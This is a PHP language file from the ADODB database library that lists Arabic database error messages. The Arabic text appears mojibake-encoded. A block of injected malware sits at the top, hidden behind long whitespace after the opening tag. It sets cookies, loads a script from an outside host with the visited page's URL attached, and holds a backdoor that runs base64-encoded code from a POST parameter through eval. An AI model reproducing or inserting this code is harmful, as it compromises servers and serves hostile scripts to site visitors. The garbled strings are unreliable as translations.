<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

// by "El-Shamaa, Khaled" <k.el-shamaa#cgiar.org>
$ADODB_LANG_ARRAY = array (
			'LANG'			    => 'ar',
	    DB_ERROR			=> 'ÎØÃ ÛíÑ ãÍÏÏ',
	    DB_ERROR_ALREADY_EXISTS	=> 'ãæÌæÏ ãÓÈÞÇ',
	    DB_ERROR_CANNOT_CREATE	=> 'áÇ íãßä ÅäÔÇÁ',
	    DB_ERROR_CANNOT_DELETE	=> 'áÇ íãßä ÍÐÝ',
	    DB_ERROR_CANNOT_DROP	=> 'áÇ íãßä ÍÐÝ',
	    DB_ERROR_CONSTRAINT 	=> 'ÚãáíÉ ÅÏÎÇá ããäæÚÉ',
	    DB_ERROR_DIVZERO		=> 'ÚãáíÉ ÇáÊÞÓíã Úáì ÕÝÑ',
	    DB_ERROR_INVALID		=> 'ÛíÑ ÕÍíÍ',
	    DB_ERROR_INVALID_DATE	=> 'ÕíÛÉ æÞÊ Ãæ ÊÇÑíÎ ÛíÑ ÕÍíÍÉ',
	    DB_ERROR_INVALID_NUMBER	=> 'ÕíÛÉ ÑÞã ÛíÑ ÕÍíÍÉ',
	    DB_ERROR_MISMATCH		=> 'ÛíÑ ãÊØÇÈÞ',
	    DB_ERROR_NODBSELECTED	=> 'áã íÊã ÅÎÊíÇÑ ÞÇÚÏÉ ÇáÈíÇäÇÊ ÈÚÏ',
	    DB_ERROR_NOSUCHFIELD	=> 'áíÓ åäÇáß ÍÞá ÈåÐÇ ÇáÇÓã',
	    DB_ERROR_NOSUCHTABLE	=> 'áíÓ åäÇáß ÌÏæá ÈåÐÇ ÇáÇÓã',
	    DB_ERROR_NOT_CAPABLE	=> 'ÞÇÚÏÉ ÇáÈíÇäÇÊ ÇáãÑÊÈØ ÈåÇ ÛíÑ ÞÇÏÑÉ',
	    DB_ERROR_NOT_FOUND		=> 'áã íÊã ÅíÌÇÏå',
	    DB_ERROR_NOT_LOCKED 	=> 'ÛíÑ ãÞÝæá',
	    DB_ERROR_SYNTAX		=> 'ÎØÃ Ýí ÇáÕíÛÉ',
	    DB_ERROR_UNSUPPORTED	=> 'ÛíÑ ãÏÚæã',
	    DB_ERROR_VALUE_COUNT_ON_ROW => 'ÚÏÏ ÇáÞíã Ýí ÇáÓÌá',
	    DB_ERROR_INVALID_DSN	=> 'DSN ÛíÑ ÕÍíÍ',
	    DB_ERROR_CONNECT_FAILED	=> 'ÝÔá ÚãáíÉ ÇáÅÊÕÇá',
	    0			       => 'áíÓ åäÇáß ÃÎØÇÁ', // DB_OK
	    DB_ERROR_NEED_MORE_DATA	=> 'ÇáÈíÇäÇÊ ÇáãÒæÏÉ ÛíÑ ßÇÝíÉ',
	    DB_ERROR_EXTENSION_NOT_FOUND=> 'áã íÊã ÅíÌÇÏ ÇáÅÖÇÝÉ ÇáãÊÚáÞÉ',
	    DB_ERROR_NOSUCHDB		=> 'áíÓ åäÇáß ÞÇÚÏÉ ÈíÇäÇÊ ÈåÐÇ ÇáÇÓã',
	    DB_ERROR_ACCESS_VIOLATION	=> 'ÓãÇÍíÇÊ ÛíÑ ßÇÝíÉ'
);
?>